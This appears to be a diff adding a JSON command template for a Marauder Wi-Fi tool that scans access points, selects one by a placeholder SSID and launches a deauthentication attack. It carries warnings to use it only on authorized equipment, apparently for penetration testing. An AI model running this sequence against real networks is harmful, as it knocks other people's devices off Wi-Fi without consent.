@@ -1,0 +1,33 @@
+{
+  "name": "[TEMPLATE — REVIEW] Marauder — targeted deauth (arm required)",
+  "description": "TEMPLATE — transmits. Deauth a single AP you own or are authorized to test. Confirm-gated; cannot fire until you type a TARGET_SSID (an unfilled filter selects nothing). Only run on equipment you are authorized to test.",
+  "steps": [
+    {
+      "command": "scanap",
+      "delay_ms": 0,
+      "expected_response": ""
+    },
+    {
+      "command": "stopscan",
+      "delay_ms": 6000,
+      "expected_response": ""
+    },
+    {
+      "command": "list -a",
+      "delay_ms": 500,
+      "expected_response": ""
+    },
+    {
+      "command": "select -a -f \"{{TARGET_SSID}}\"",
+      "delay_ms": 500,
+      "expected_response": ""
+    },
+    {
+      "command": "attack -t deauth",
+      "delay_ms": 500,
+      "expected_response": ""
+    }
+  ],
+  "created_at": "2026-07-03T00:00:00+00:00",
+  "device_protocol": "marauder-attack"
+}
